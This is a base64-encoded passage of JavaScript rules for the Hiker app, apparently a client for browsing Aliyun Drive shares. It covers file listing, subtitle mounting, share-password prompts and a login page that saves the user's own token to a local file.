FwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYW5jZWw6ICgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJtb3VudHppbXVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+W3sua4hemZpOaJi+WKqOaMgui9veWtl+W5lVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFxcXFxcIuiOt+WPluW8ueW5leaQnOe0ouinhOWImVxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcImpzXFxcXFxcXCI6IEpTT04uc3RyaW5naWZ5KFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2xvYWREbT9ydWxlPVxcXFxcXFwiICsgTVlfUlVMRS50aXRsZStcXFxcXFxcIiZ0aXRsZT1cXFxcXFxcIikrXFxcXFxcXCIrZW5jb2RlVVJJQ29tcG9uZW50KHBsYXlkYXRhLnRpdGxlLnNwbGl0KCctJylbMF0pO1xcXFxcXFwiLCBcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJuYW1lXFxcXFxcXCI6IE1ZX1JVTEUudGl0bGUgKyBcXFxcXFxcIuW8ueW5leaQnOe0olxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJydWxlOi8vXFxcXFxcXCIgKyBiYXNlNjRFbmNvZGUoXFxcXFxcXCLvv6Vwcm9qZWN0aW9uX3NjcmVlbu+/pVxcXFxcXFwiICsgSlNPTi5zdHJpbmdpZnkocnVsZSkpO1xcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgfSwgc2hhcmVJZCwgc2hhcmVQd2QsIGZpbGVJZCksXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaWNvbl9yb3VuZF9zbWFsbF80XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgcGljX3VybDogXFxcXFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vaW1nL2FsaV9maWxlaW50by5zdmdcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGl0ZW1zLnB1c2goe1xcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgcmVzY29kID0ge307XFxcXG4gICAgbGV0IG1hcmtlciA9IE1ZX1BBUkFNUy5tYXJrZXI7ICAgIFxcXFxuICAgIGlmIChpc1NlYXJjaCkge1xcXFxuICAgICAgICByZXNjb2QgPSBhbGlTaGFyZUFwaS5nZXRTZWFyY2hMaXN0RmlsZShzZWFyY2hLZXksIG1hcmtlciwgb3JkZXJbMF0sIG9yZGVyWzFdKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXNjb2QgPSBhbGlTaGFyZUFwaS5nZXRMaXN0RmlsZShmaWxlSWQsIG1hcmtlciwgb3JkZXJbMF0sIG9yZGVyWzFdKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKHJlc2NvZC5uZXh0X21hcmtlcikge1xcXFxuICAgICAgICBzZXRNYXJrZXIocmVzY29kLm5leHRfbWFya2VyKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICBzZXRNYXJrZXIoKTtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICB2YXIgY29udHMgPSByZXNjb2QuaXRlbXM7XFxcXG4gICAgLy/lrZfluZXljLnphY3lh4blpIdcXFxcbiAgICBsZXQgc3ViRXh0cz1bXFxcXFxcXCJ2dHRcXFxcXFxcIiwgXFxcXFxcXCJzcnRcXFxcXFxcIiwgXFxcXFxcXCJhc3NcXFxcXFxcIl07XFxcXG4gICAgdmFyIHppbXVsaXN0ID0gW107XFxcXG4gICAgY29udHMuZm9yRWFjaCgoaXRlbSkgPT4ge1xcXFxuICAgICAgICBpZiAoc3ViRXh0cy5pbmNsdWRlcyhpdGVtLmZpbGVfZXh0ZW5zaW9uICYmIGl0ZW0uZmlsZV9leHRlbnNpb24udG9Mb3dlckNhc2UoKSkpIHtcXFxcbiAgICAgICAgICAgIGxldCBuYW1lID0gaXRlbS5uYW1lLnJlcGxhY2UoJy4nICsgaXRlbS5maWxlX2V4dGVuc2lvbiwgJycpO1xcXFxuICAgICAgICAgICAgemltdWxpc3QucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgZXh0OiBpdGVtLmZpbGVfZXh0ZW5zaW9uLFxcXFxuICAgICAgICAgICAgICAgIGZpbGVfaWQ6IGl0ZW0uZmlsZV9pZCxcXFxcbiAgICAgICAgICAgICAgICBuYW1lOiBuYW1lXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuICAgIC8v5aSE55CG5aS46aG15Yy56YWN5a2X5bmVXFxcXG4gICAgLypcXFxcbiAgICBsZXQgaGFzU3ViID0gemltdWxpc3QubGVuZ3RoID4gMDtcXFxcbiAgICBpZiAoaGFzU3ViJiZyZXNjb2QubmV4dF9tYXJrZXIpIHtcXFxcbiAgICAgICAgaWYgKHppbXVsaXN0Lmxlbmd0aCA+IDQpIHtcXFxcbiAgICAgICAgICAgIHNldFN1YnRpdGxlQ2FjaGUoemltdWxpc3Quc2xpY2UoLTQpKTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHNldFN1YnRpdGxlQ2FjaGUoemltdWxpc3QpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIGxldCBsYXN0SXRlbSA9IGNvbnRzLmF0KC0xKTtcXFxcbiAgICBpZiAoaGFzU3ViJiZsYXN0SXRlbSYmbGFzdEl0ZW0uY2F0ZWdvcnkgPT09IFxcXFxcXFwidmlkZW9cXFxcXFxcIikge1xcXFxuICAgICAgICBzZXRWaWRlb0l0ZW1DYWNoZShjb250cy5zcGxpY2UoY29udHMubGVuZ3RoLTEsMSkpO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoTVlfUEFHRSA+IDEpIHtcXFxcbiAgICAgICAgbGV0IHN1YnRpdGxlQ2FjaGUgPSBNWV9QQVJBTVMuc3VidGl0bGVDYWNoZSB8fCBbXTtcXFxcbiAgICAgICAgemltdWxpc3QgPSB6aW11bGlzdC5jb25jYXQoc3VidGl0bGVDYWNoZSk7XFxcXG4gICAgICAgIGxldCB2aWRlb0l0ZW1DYWNoZSA9IE1ZX1BBUkFNUy52aWRlb0l0ZW1DYWNoZSB8fCBbXTtcXFxcbiAgICAgICAgY29udHMgPSB2aWRlb0l0ZW1DYWNoZS5jb25jYXQoY29udHMpO1xcXFxuICAgICAgICBzZXRTdWJ0aXRsZUNhY2hlKCk7XFxcXG4gICAgICAgIHNldFZpZGVvSXRlbUNhY2hlKCk7XFxcXG4gICAgfSovXFxcXG4gICAgLy/nroDkvZPkvJjlhYhcXFxcbiAgICB6aW11bGlzdC5zb3J0KChhLCBiKSA9PiAoYi5uYW1lLmVuZHNXaXRoKFxcXFxcXFwiLnNjXFxcXFxcXCIpIHx8IGIubmFtZS5lbmRzV2l0aChcXFxcXFxcIi5jaHNcXFxcXFxcIikpIC0gKGEubmFtZS5lbmRzV2l0aChcXFxcXFxcIi5zY1xcXFxcXFwiKSB8fCBhLm5hbWUuZW5kc1dpdGgoXFxcXFxcXCIuY2hzXFxcXFxcXCIpKSk7XFxcXG4gICAgLy9lbmRcXFxcbiAgICBsZXQgdGl0bGVIZWFkID0ge1xcXFxuICAgICAgICB2aWRlbzogXFxcXFxcXCLwn46sXFxcXFxcXCIsXFxcXG4gICAgICAgIGF1ZGlvOiBcXFxcXFxcIvCfjrVcXFxcXFxcIixcXFxcbiAgICAgICAgZG9jOiBcXFxcXFxcIvCfk5FcXFxcXFxcIixcXFxcbiAgICAgICAgaW1hZ2U6IFxcXFxcXFwi8J+WvFxcXFxcXFwiLFxcXFxuICAgICAgICB6aXA6IFxcXFxcXFwi8J+TplxcXFxcXFwiLFxcXFxuICAgICAgICBmb2xkZXI6IFxcXFxcXFwi8J+TglxcXFxcXFwiXFxcXG4gICAgfTtcXFxcbiAgICBsZXQgZm9sZGVyU3R5bGUsIGZpbGVTdHlsZSwgaXNXYXRjaGluZyA9IHN0eWxlID09PSBcXFxcXFxcIui/veWJp1xcXFxcXFwiO1xcXFxuICAgIGlmIChpc1dhdGNoaW5nKSB7XFxcXG4gICAgICAgIGZvbGRlclN0eWxlID0gXFxcXFxcXCJhdmF0YXJcXFxcXFxcIjtcXFxcbiAgICAgICAgZmlsZVN0eWxlID0gXFxcXFxcXCJtb3ZpZV8yXFxcXFxcXCI7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgZm9sZGVyU3R5bGUgPSBmaWxlU3R5bGUgPSBzdHlsZTtcXFxcbiAgICB9XFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBjb250cy5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICBsZXQgZmlsZUl0ZW0gPSBjb250c1tpXTtcXFxcbiAgICAgICAgbGV0IGNhdGUgPSBmaWxlSXRlbS5jYXRlZ29yeTtcXFxcbiAgICAgICAgbGV0IGRlc2MgPSBmb3JtYXREYXRlKGZpbGVJdGVtLnVwZGF0ZWRfYXQpO1xcXFxuICAgICAgICBsZXQgcGljX3VybCA9IGdldEljb24oZmlsZUl0ZW0uZmlsZV9leHRlbnNpb24sIGZpbGVJdGVtLnR5cGUpO1xcXFxuXFxcXG4gICAgICAgIGlmIChmaWxlSXRlbS50eXBlID09PSBcXFxcXFxcImZvbGRlclxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSAoZm9sZGVyU3R5bGUgPT09IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIgPyB0aXRsZUhlYWQuZm9sZGVyIDogXFxcXFxcXCJcXFxcXFxcIikgKyBmaWxlSXRlbS5uYW1lO1xcXFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vcGFnZS9hbGl5dW4/cGFnZT1meXBhZ2UnLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBmb2xkZXJTdHlsZSxcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBmb3JtYXREYXRlKGZpbGVJdGVtLnVwZGF0ZWRfYXQpLFxcXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IHBpY191cmwsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc2hhcmVJZDogc2hhcmVJZCxcXFxcbiAgICAgICAgICAgICAgICAgICAgc2hhcmVUb2tlbjogTVlfUEFSQU1TLnNoYXJlVG9rZW4sXFxcXG4gICAgICAgICAgICAgICAgICAgIGZpbGVJZDogZmlsZUl0ZW0uZmlsZV9pZCxcXFxcbiAgICAgICAgICAgICAgICAgICAgc2hhcmVQd2Q6IHNoYXJlUHdkLFxcXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGZpbGVJdGVtLm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICBsZXQgc3VidGl0bGUsIGxvbmdjLCBjbHM7XFxcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSAoZmlsZVN0eWxlID09PSBcXFxcXFxcInRleHRfMVxcXFxcXFwiID8gKHRpdGxlSGVhZFtjYXRlXSB8fCBcXFxcXFxcIuKdk1xcXFxcXFwiKSA6IFxcXFxcXFwiXFxcXFxcXCIpICsgZmlsZUl0ZW0ubmFtZTtcXFxcbiAgICAgICAgICAgIGxldCBuYW1lTm90RXh0ID0gZmlsZUl0ZW0ubmFtZS5yZXBsYWNlKCcuJyArIGZpbGVJdGVtLmZpbGVfZXh0ZW5zaW9uLCAnJyk7XFxcXG4gICAgICAgICAgICBpZiAoc3ViRXh0cy5pbmNsdWRlcyhmaWxlSXRlbS5maWxlX2V4dGVuc2lvbikpIHtcXFxcbiAgICAgICAgICAgICAgICBsb25nYyA9IFt7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuaMgui9veWtl+W5lVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygoem0pID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKCdtb3VudHppbXUnLCB6bSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5oyC6L295a6M5oiQ77yM5b2T5YmN5a2X5bmV5paH5Lu2OiAnICsgem0ubmFtZSArICcuJyArIHptLmV4dDtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXh0OiBmaWxlSXRlbS5maWxlX2V4dGVuc2lvbixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQ6IGZpbGVJdGVtLmZpbGVfaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiBuYW1lTm90RXh0XFxcXG4gICAgICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgIH1dO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaWYgKGNhdGUgPT09IFxcXFxcXFwidmlkZW9cXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIGlmICh6aW11bGlzdC5sZW5ndGgpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc3VidGl0bGUgPSB6aW11bGlzdC5maW5kKHYgPT4gdi5uYW1lLmluY2x1ZGVzKG5hbWVOb3RFeHQpKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgY2xzID0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIHBpY191cmwgPSBmaWxlSXRlbS50aHVtYm5haWwgfHwgcGljX3VybDtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoaXNXYXRjaGluZykge1xcXFxuICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICBpZiAoZmlsZVN0eWxlID09PSBcXFxcXFxcInRleHRfMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgZGVzYyArPSBcXFxcXFxcIlxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFwiICsgZm9ybWF0U2l6ZShmaWxlSXRlbS5zaXplKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoKS5sYXp5UnVsZSgoc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGZpbGVJZCwgY2F0ZSwgc3VidGl0bGUpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9hbGlsYXp5XFxcXFxcXCIpKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBmaWxlSWQsIGNhdGUsIHN1YnRpdGxlKTtcXFxcbiAgICAgICAgICAgICAgICB9LCBzaGFyZUlkLCBzaGFyZVB3ZCwgTVlfUEFSQU1TLnNoYXJlVG9rZW4sIGZpbGVJdGVtLmZpbGVfaWQsIGNhdGUsIHN1YnRpdGxlKSxcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBkZXNjLFxcXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IHBpY191cmwsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGZpbGVJdGVtLmZpbGVfaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgIGxvbmdDbGljazogbG9uZ2MsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNsczogY2xzLFxcXFxuICAgICAgICAgICAgICAgICAgICAvL2luaGVyaXRUaXRsZTogZmFsc2UsXFxcXG4gICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogZmlsZUl0ZW0ubmFtZVxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IGZpbGVTdHlsZVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgaWYgKGNvbnRzLmxlbmd0aCA9PT0gMCkge1xcXFxuICAgICAgICBpdGVtcy5wdXNoKHtcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIFxcXFxcXFwifn5+5LuA5LmI6YO95rKh5pyJ5LqG5ZOmfn5+XFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiR3JheVxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbmxldCBpdGVtcyA9IFtdO1xcXFxudHJ5IHtcXFxcbiAgICBpZiAoTVlfUEFHRSA+IDEgJiYgIU1ZX1BBUkFNUy5tYXJrZXIpIHtcXFxcbiAgICAgICAgaXRlbXMucHVzaCh7XFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBcXFxcXFxcIn5+fuS7gOS5iOmDveayoeacieS6huWTpn5+flxcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIkdyYXlcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZSxcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgbG9hZChpdGVtcyk7XFxcXG4gICAgfVxcXFxufSBjYXRjaCAoZSkge1xcXFxuICAgIGlmIChlLm5hbWUgPT09IFxcXFxcXFwiQWxpRXJyb3JcXFxcXFxcIikge1xcXFxuICAgICAgICBpZiAoZS5jb2RlID09PSBcXFxcXFxcIkludmFsaWRSZXNvdXJjZS5TaGFyZVB3ZFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLor7fovpPlhaXmj5Dlj5bnoIFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBzaGFyZVB3ZCA/IFxcXFxcXFwi4oCc4oCc5o+Q5Y+W56CB6ZSZ6K+v4oCd4oCdXFxcXFxcXCIgOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgpLmlucHV0KChNWV9QQVJBTVMpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc2V0UGFnZVBhcmFtcyhPYmplY3QuYXNzaWduKHt9LCBNWV9QQVJBTVMsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBpbnB1dFxcXFxuICAgICAgICAgICAgICAgICAgICB9KSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgfSwgTVlfUEFSQU1TKSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgaWYgKGUuc2lnbmlmaWNhbmNlID09PSAxKSB7XFxcXG4gICAgICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgZS5tZXNzYWdlLmJpZygpLmJpZygpLmZvbnRjb2xvcihcXFxcXFxcInJlZFxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoZS5zaWduaWZpY2FuY2UgPT09IDMpIHtcXFxcbiAgICAgICAgICAgICAgICBpdGVtcy5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBlLm1lc3NhZ2UuYmlnKCkuZm9udGNvbG9yKFxcXFxcXFwiZ3JlZW5cXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuXFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgbG9nKFxcXFxcXFwi5YiX6KGo5Yqg6L295aSx6LSlI1xcXFxcXFxcbumUmeivr+S/oeaBrz5cXFxcXFxcIiArIGUudG9TdHJpbmcoKSArIFxcXFxcXFwiXFxcXFxcXFxu6ZSZ6K+v6KGMPlxcXFxcXFwiICsgZS5saW5lTnVtYmVyKTtcXFxcbiAgICAgICAgaXRlbXMucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJ+asp+asp++8jOaKpemUmeS6huOAguWcqOWIt+aWsOWHoOasoe+8n+aIluiAheabtOaNouaWh+S7tuWkueOAgicsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogZS50b1N0cmluZygpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgLy90aHJvdyBlO1xcXFxuICAgIH1cXFxcbn1cXFxcbnNhdmVNeVBhQ2FjaGUoKTtcXFxcbnNldFJlc3VsdChpdGVtcyk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi55m75b2V6LSm5Y+3XFxcIixcXFwicGF0aFxcXCI6XFxcImxvZ2luXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbnNldFBhZ2VUaXRsZShcXFxcXFxcIumYv+mHjOS6keebmOeZu+mZhlxcXFxcXFwiKTtcXFxcbmxldCBsb2dpblVybHMgPSBbXFxcXFxcXCJodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vc2lnblxcXFxcXFwiLCBcXFxcXFxcImh0dHBzOi8vYXV0aC5hbGl5dW5kcml2ZS5jb20vdjIvb2F1dGgvYXV0aG9yaXplP2xvZ2luX3R5cGU9Y3VzdG9tJnJlc3BvbnNlX3R5cGU9Y29kZSZyZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZ3d3cuYWxpeXVuZHJpdmUuY29tJTJGc2lnbiUyRmNhbGxiYWNrJmNsaWVudF9pZD0yNWR6WDN2Yllxa3RWeHlYJnN0YXRlPSU3QiUyMm9yaWdpbiUyMiUzQSUyMiolMjIlN0QjL2xvZ2luXFxcXFxcXCJdO1xcXFxubGV0IGluZGV4ID0gTnVtYmVyKGdldFBhcmFtKFxcXFxcXFwiaW5kZXhcXFxcXFxcIiwgXFxcXFxcXCIxXFxcXFxcXCIpKTtcXFxcbmlmIChOdW1iZXIuaXNOYU4oaW5kZXgpKSB7XFxcXG4gICAgaW5kZXggPSAxO1xcXFxufVxcXFxubGV0IHVybCA9IGxvZ2luVXJsc1tpbmRleF07XFxcXG5sZXQgaXNSZWZyZXNoID0gIWdldFBhcmFtKFxcXFxcXFwibm9SZWZyZXNoXFxcXFxcXCIpO1xcXFxubGV0IGFsaVRva2Vuc0ZpbGVwYXRoPSAkLnJlcXVpcmUoXFxcXFxcXCJ0b2tlblBhdGhcXFxcXFxcIikuYWxpVG9rZW5zRmlsZXBhdGg7XFxcXG5cXFxcbnZhciBqcyA9ICQudG9TdHJpbmcoKGlzUmVmcmVzaCwgYWxpVG9rZW5zRmlsZXBhdGgpID0+IHtcXFxcbiAgICBzZXRJbnRlcnZhbCgoKSA9PiB7XFxcXG4gICAgICAgIHZhciB0b2tlbiA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJykpXFxcXG4gICAgICAgIGlmICh0b2tlbiAmJiB0b2tlbi51c2VyX2lkKSB7XFxcXG4gICAgICAgICAgICBsZXQgdG9rZW5fdXJsID0gYWxpVG9rZW5zRmlsZXBhdGg7XFxcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLndyaXRlRmlsZSh0b2tlbl91cmwsIEpTT04uc3RyaW5naWZ5KHRva2VuKSk7XFxcXG4gICAgICAgICAgICBsb2NhbFN0b3JhZ2UuY2xlYXIoKTtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAuYmFjayhpc1JlZnJlc2gpO1xcXFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC50b2FzdCgnVE9LRU7ojrflj5bmiJDlip/vvIzor7fli7/ms4TmvI/kuKrkurrpmpDnp4HvvIHvvIHvvIEnKTtcXFxcbiAgICAgICAgICAgIHJldHVybjtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sIDMwMCk7XFxcXG59LCBpc1JlZnJlc2gsIGFsaVRva2Vuc0ZpbGVwYXRoKTtcXFxcblxcXFxuZC5wdXNoKHtcXFxcbiAgICB1cmw6IHVybCxcXFxcbiAgICBjb2xfdHlwZTogJ3g1X3dlYnZpZXdfc2luZ2xlJyxcXFxcbiAgICBkZXNjOiAnMTAwJSYmZmxvYXQnLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIGNhbkJhY2s6IGZhbHNlLFxcXFxuICAgICAgICBqczoganMsXFxcXG4gICAgICAgIHVybEludGVyY2VwdG9yOiAkLnRvU3RyaW5nKCgpID0+IHRydWUpXFxcXG4gICAgfVxcXFxufSk7XFxcXG5zZXRSZXN1bHQoZCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6Zi/6YeM5YiX6KGoQVBJXFxcIixcXFwicGF0aFxcXCI6XFxcIkFsaUFwaVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbi8vQGF1dGhvciBMb3lEZ0lrXFxcXG5mdW5jdGlvbiBBbGlFcnJvcihlcnJvckNvZGUsIG1lc3NhZ2UsIHNpZ25pZmljYW5jZSkge1xcXFxuICAgIGxldCBlcnJvclR5cGUgPSBBbGlFcnJvci5lcnJvckNvZGVNYXAuZ2V0KGVycm9yQ29kZSkgfHwgW107XFxcXG4gICAgdGhpcy5jb2RlID0gZXJyb3JDb2RlO1xcXFxuICAgIHRoaXMubWVzc2FnZSA9IGVycm9yVHlwZVswXSB8fCBtZXNzYWdlIHx8IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgdGhpcy5uYW1lID0gXFxcXFxcXCJBbGlFcnJvclxcXF